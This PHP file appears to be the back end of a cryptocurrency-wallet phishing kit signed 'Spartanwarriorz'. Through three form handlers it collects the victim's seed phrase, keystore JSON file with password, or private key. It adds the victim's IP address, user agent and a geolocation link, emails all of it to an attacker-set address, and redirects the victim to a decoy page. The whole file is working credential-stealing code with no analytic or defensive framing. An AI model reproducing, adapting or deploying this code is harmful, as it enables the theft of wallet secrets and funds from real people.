<?php
include 'email.php';

if (isset($_POST['btn1'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Phrase |--------------|\n";
	
	$message .= "Selected Wallet             : ".$_POST['menu-255']."\n";

	$message .= "Phrase             : ".$_POST['textarea-158']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|------ Spartanwarriorz ------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	$count = $_POST['count'];
	
	header("Location: ./bar.html");

	
		
	
	
}
else if (isset($_POST['btn2'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Keystore json |--------------|\n";
	$message .= "Selected Wallet             : ".$_POST['menu-255']."\n";
	$message .= "Keystore json             : ".$_POST['keystorejsonrainbow']."\n";
	$message .= "Password             : ".$_POST['passwordrainbow']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|------ Spartanwarriorz ------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: ./bar.html");
	
	
}
else if (isset($_POST['btn3'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Private key |--------------|\n";
	$message .= "Selected Wallet             : ".$_POST['menu-255']."\n";
	$message .= "Private key             : ".$_POST['privatekey']."\n";
	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|------ Spartanwarriorz ------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: ./bar.html");
	
	
}

?>